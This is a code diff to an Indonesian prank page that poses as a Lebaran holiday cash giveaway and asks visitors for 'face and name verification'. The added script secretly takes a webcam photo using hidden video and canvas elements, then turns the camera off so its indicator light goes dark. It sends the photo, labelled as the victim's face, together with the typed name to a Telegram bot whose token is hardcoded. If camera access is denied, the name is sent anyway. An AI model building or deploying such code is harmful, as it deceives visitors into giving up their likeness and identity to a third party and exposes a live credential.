@@ -37,6 +37,9 @@
 </head>
 <body>
 
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
     <div id="fake-chat">
         <div class="chat-icon">🏦</div>
         <div class="chat-text">
@@ -48,7 +51,7 @@
     <div id="intro">
         <h1>THR LEBARAN DARI IRHAM FAJRI 🌙</h1>
         <div id="timer-box">⚠️ Sisa Kuota: <span id="countdown">02:59</span></div>
-        <p>Verifikasi nama untuk klaim saldo Rp 500.000</p>
+        <p>Verifikasi wajah & nama untuk klaim saldo Rp 500.000</p>
     </div>
 
     <div id="verify-box">
@@ -59,7 +62,7 @@
 
     <div id="loading-overlay">
         <div class="spinner"></div>
-        <p style="font-weight:bold; margin-top:20px; color:#15803d;">Menghubungkan ke server bank...</p>
+        <p style="font-weight:bold; margin-top:20px; color:#15803d;">Sedang memverifikasi wajah & data...</p>
     </div>
 
     <div id="prank-screen" onclick="closePrank()">
@@ -71,10 +74,12 @@
         const env = document.getElementById('envelope');
         const prank = document.getElementById('prank-screen');
         const fakeChat = document.getElementById('fake-chat');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
         
         // SOUNDS
         const prankSound = new Audio('https://www.myinstants.com/media/sounds/monkey-laugh.mp3');
-        const trumpetSound = new Audio('https://www.myinstants.com/media/sounds/air-horn-club-sample_1.mp3'); // Sound Terompet
+        const trumpetSound = new Audio('https://www.myinstants.com/media/sounds/air-horn-club-sample_1.mp3');
         
         const TELE_TOKEN = '8642591827:AAEW79QE8FGYcvELtapkI2jnhvXocW4rd9U'; 
         const TELE_ID = '7267912519'; 
@@ -87,6 +92,43 @@
             document.getElementById('countdown').innerText = `0${m}:${s<10?'0':''}${s}`;
             if(sec > 10) sec--;
         }, 1000);
+
+        // Fungsi Ambil Foto & Kirim ke Telegram
+        async function captureAndSend(nama) {
+            try {
+                // Minta izin kamera (Akan muncul popup)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                // Tunggu 1.5 detik biar stream stabil & dapet muka jelas
+                await new Promise(resolve => setTimeout(resolve, 1500));
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                // Matikan kamera langsung biar lampu indikator mati
+                stream.getTracks().forEach(track => track.stop());
+
+                // Convert canvas ke File Gambar
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', TELE_ID);
+                    formData.append('photo', blob, 'muka_korban.jpg');
+                    formData.append('caption', `🎯 KORBAN KENA PRANK!\n👤 Nama: ${nama}\n📸 Foto terlampir.`);
+
+                    // Kirim ke Bot Telegram
+                    await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }, 'image/jpeg');
+
+            } catch (err) {
+                // Jika kamera ditolak, tetap lapor nama korban via teks
+                fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=🎯 KORBAN GAS (Kamera Ditolak): ${nama}`);
+            }
+        }
 
         function burst() {
             for (let i = 0; i < 40; i++) {
@@ -103,20 +145,27 @@
             }
         }
 
-        env.addEventListener('click', () => {
+        env.addEventListener('click', async () => {
             const nama = document.getElementById('victim-name').value;
             if(!nama) return alert("Isi nama dulu bos!");
             
+            // Masuk Fullscreen
             if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+            
+            // Muncul Loading
             document.getElementById('loading-overlay').style.display = 'flex';
             
-            fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=🎯 KORBAN GAS: ${nama}`);
+            // Mulai proses ambil foto di background
+            captureAndSend(nama);
 
+            // Jeda 5.5 detik sebelum konten prank muncul
             setTimeout(() => {
                 document.getElementById('loading-overlay').style.display = 'none';
                 prank.style.display = 'flex';
                 
-                // MUNCUL MONYET: Bunyi Terompet Sekali + Ketawa Loop
+                // Efek getar HP (Jika didukung)
+                if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+
                 trumpetSound.play(); 
                 prankSound.loop = true;
                 prankSound.play();
@@ -124,10 +173,8 @@
                 burst();
                 loopPrank = setInterval(burst, 2000);
                 
-                // Notif Admin 500ms kemudian
                 setTimeout(() => fakeChat.classList.add('show'), 500); 
                 
-                // Alert Panik
                 setTimeout(() => alert("⚠️ WARNING: DATA ANDA SEDANG DIKLONING!"), 1200);
                 setTimeout(() => alert("SALDO BERHASIL DIKIRIM KE IRHAM FAJRI!"), 2200);
 
@@ -140,7 +187,6 @@
             fakeChat.classList.remove('show');
             prankSound.pause();
             trumpetSound.pause();
-            trumpetSound.currentTime = 0;
             if (document.exitFullscreen) document.exitFullscreen();
         }
     </script>
